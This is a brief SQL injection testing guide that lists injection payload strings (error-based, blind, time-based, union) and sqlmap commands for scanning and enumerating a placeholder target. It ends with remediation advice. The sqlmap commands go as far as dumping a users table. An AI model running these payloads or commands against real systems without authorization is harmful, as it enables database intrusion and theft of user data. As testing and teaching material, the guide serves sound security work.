# SQL Injection Testing Guide

## Overview
SQL injection occurs when untrusted data is sent to an interpreter as part of a command or query. The attacker's hostile data can trick the interpreter into executing unintended commands.

## Detection Techniques

### Error-Based Detection
```
' OR 1=1--
" OR 1=1--
' OR 'a'='a
') OR ('a'='a
```

### Boolean-Based Blind
```
' AND 1=1--  (true condition)
' AND 1=2--  (false condition)
Compare response differences
```

### Time-Based Blind
```
' AND SLEEP(5)--          (MySQL)
' AND pg_sleep(5)--       (PostgreSQL)
'; WAITFOR DELAY '0:0:5'-- (MSSQL)
```

### Union-Based
```
' UNION SELECT NULL--
' UNION SELECT NULL,NULL--
' UNION SELECT 1,2,3--
```

## sqlmap Usage Patterns

### Basic scan
```bash
sqlmap -u "http://target/page?id=1" --batch
```

### POST data
```bash
sqlmap -u "http://target/login" --data="user=admin&pass=test" --batch
```

### Thorough scan
```bash
sqlmap -u "http://target/page?id=1" --level 5 --risk 3 --batch
```

### Database enumeration
```bash
sqlmap -u "http://target/page?id=1" --dbs --batch
sqlmap -u "http://target/page?id=1" -D dbname --tables --batch
sqlmap -u "http://target/page?id=1" -D dbname -T users --dump --batch
```

## Remediation
- Use parameterized queries / prepared statements
- Use stored procedures
- Implement input validation (allowlist)
- Apply least privilege to database accounts
- Use WAF as defense-in-depth
